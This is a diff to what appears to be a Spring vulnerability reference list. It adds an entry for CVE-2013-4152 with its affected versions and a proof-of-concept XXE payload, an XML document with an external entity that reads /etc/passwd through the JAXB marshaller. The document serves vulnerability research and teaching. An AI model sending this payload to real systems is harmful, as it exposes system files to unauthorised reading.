@@ -22,6 +22,7 @@ A list for Spring Security
 | Spring Framework | CVE-2020-5398 | Reflected File Download |
 | Spring Framework | CVE-2020-5421 | Reflected File Download |
 | Spring Framework | CVE-2022-22965 | RCE |
+| Spring Framework | CVE-2013-4152 | XXE |
 | Spring Integration Zip | CVE-2018-1261 | Arbitrary File Write |
 
 ## Programming Environment Setup
@@ -611,6 +612,20 @@ private String removeJsessionid(String requestUri) {
     return requestUri;
 }
 ```
+
+### CVE-2013-4152
+Affected Version: Spring Framework before 3.2.4 and 4.0.0.M1 using the JAXB marshaller
+
+POC:
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE test [
+        <!ELEMENT test ANY>
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+        ]>
+<Order><id>&xxe;</id></Order>
+```
+
 
 ### CVE-2022-22965
 Affected Version: 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions
